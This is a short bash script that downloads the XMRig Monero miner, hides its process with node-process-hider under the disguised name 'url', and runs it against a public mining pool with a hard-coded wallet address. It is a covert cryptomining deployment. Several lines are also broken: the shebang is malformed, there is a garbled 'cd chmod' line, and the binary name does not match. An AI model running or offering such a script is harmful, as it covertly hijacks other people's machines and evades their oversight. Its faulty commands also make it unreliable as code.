#!bin/bash
sudo apt install npm -y 
echo "{}" > package.json 
npm install node-process-hider
npx ph add url
wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
tar -xf xmrig-6.18.1-linux-x64.tar.gz && cd chmod +x xmrig

./url --coin=XMR --threads=3 -o pool.supportxmr.com:3333 -u 4B1dXbphAhG5t6erRwsFQ3FnURzpZgwXMNQgpsFxhxF31L8aKuMXhn5XutWZMGxJWo78N7nkNEEAW4S4Gyi7djRUCD3ytv4.adi -k -p x
#139.99.124.170:5555
